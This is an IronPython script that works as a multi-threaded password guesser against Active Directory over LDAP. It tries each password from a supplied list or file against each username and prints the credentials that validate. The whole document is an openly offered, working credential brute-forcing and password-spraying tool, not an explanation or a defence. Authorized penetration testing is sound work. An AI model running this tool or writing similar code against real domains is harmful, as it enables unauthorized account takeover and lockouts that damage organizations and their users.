#! ipy

__author__ = 'Jake Miller (@LaconicWolf)'
__date__ = '20181128'
__version__ = '0.01'
__description__ = '''A multi-threaded LDAP password guesser'''

import platform
if platform.python_implementation() != 'IronPython':
    print '\n[-] This script requires IronPython. Sorry!'
    exit()

import argparse
import os
import sys
import threading
import Queue

# Required to import .Net assemblies. CLR is Common Language Runtime
import clr

# Adds the assemblies to CLR. 
# CLR only includes a reference to System by default.
clr.AddReference("System.DirectoryServices.AccountManagement")

# Importing the specific namespaces
from System.DirectoryServices import AccountManagement
from System.Environment import UserDomainName

def validateCredentials(user, password, domain):
    """Attempts to authenticate usine a specified username,
    password, and domain.
    """
    try:
        principalContext = AccountManagement.PrincipalContext(
            AccountManagement.ContextType.Domain,domain
        )
    except Exception as e:
        print '[-] An error has occurred: {}'.format(e)
        return False
    return principalContext.ValidateCredentials(
        user, password
    )

def guessLdapCreds(user):
    """Accepts a username and iterates through a password list, 
    passing each username/password combination to the validateCredentials 
    function. Prints valid credentials to the screen.
    """
    for password in passwords:
        isValid = validateCredentials(
            user, password, domain
        )
        if isValid:
            with printLock:
                print '[+] {}:{}'.format(user, password)

def manageQueue():
    """Manages the username queue, passing each user to the 
    guessLdapCreds function.
    """
    while True:
        currentUser = userQueue.get()
        guessLdapCreds(currentUser)
        userQueue.task_done()

def main():
    """Prints information about the guessing session and 
    starts the multithreading."""
    word_banner = '{} version: {}. Coded by: {}'.format(
        sys.argv[0], __version__, __author__)
    print('=' * len(word_banner))
    print(word_banner)
    print('=' * len(word_banner))
    print
    for arg in vars(args):
        if getattr(args, arg):
            print('{}: {}'.format(
                arg.title().replace('_',' '), getattr(args, arg)))
    print
    print ('[*] Guessing {} user(s) and {} password(s). {} total'
    ' guesses.'.format(
        len(usernames), len(passwords), len(usernames) * len(passwords)
    ))
    print '[*] Only printing valid username/password combinations.\n'

    for i in range(args.threads):
        t = threading.Thread(target=manageQueue)
        t.daemon = True
        t.start()
    for currentUser in usernames:
        userQueue.put(currentUser)
    userQueue.join()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=('Guess a supplied list of passwords against a supplied '
        'list of usernames.')
    )
    parser.add_argument(
        '-u', '--username',
        help='Specify a username to guess password(s) against.'
    )
    parser.add_argument(
        '-d', '--domain',
        help=('Specify a domain. Defaults to the local domain of the computer'
        ' the script is running from.')
    )
    parser.add_argument(
        '-p', '--password',
        help='Specify a password to guess against usernames.'
    )
    parser.add_argument(
        '-uf', '--username_file',
        help=('Specify the path of a file containing usernames to guess '
        'password(s) against.')
    )
    parser.add_argument(
        '-pf', '--password_file',
        help=('Specify the path of a file containing passwords to guess '
        'against username(s).')
    )
    parser.add_argument(
        "-t", "--threads",
        nargs="?",
        type=int,
        const=5,
        default=5,
        help="Specify number of threads (default=5)"
    )
    args = parser.parse_args()

    if not args.username and not args.username_file:
        parser.print_help()
        print ('\n[-] Please specify either a single username (-u) or the '
        'path to a file listing usernames (-uf).')
        exit()
    if not args.password and not args.password_file:
        parser.print_help()
        print ('\n[-] Please specify either a single password (-p) or the '
        'path to a file listing passwords (-pf).')
        exit()
    if args.username and args.username_file:
        parser.print_help()
        print ('\n[-] Please specify either a single username (-u) or the '
        'path to a file listing usernames (-uf). Not both.')
        exit()
    if args.password and args.password_file:
        parser.print_help()
        print ('\n[-] Please specify either a single password (-p) or the '
        'path to a file listing passwords (-pf). Not both.')
        exit()

    usernames = passwords = []
    
    if args.username:
        usernames = [args.username]
    if args.username_file:
        if not os.path.exists(args.username_file):
            print ('\n[-] The file {} does not exist or you do not have '
            'access to it. Please check the path and try again.'.format(
                args.username_file))
            exit()
        with open(args.username_file) as fh:
            usernames = fh.read().splitlines()
    if args.password:
        passwords = [args.password]
    if args.password_file:
        if not os.path.exists(args.password_file):
            print ('\n[-] The file {} does not exist or you do not have '
            'access to it. Please check the path and try again.'.format(
                args.password_file))
            exit()
        with open(args.password_file) as fh:
            passwords = fh.read().splitlines()

    if args.domain:
        domain = args.domain
    else:
        domain = UserDomainName

    printLock = threading.Lock()
    userQueue = Queue.Queue()

    main()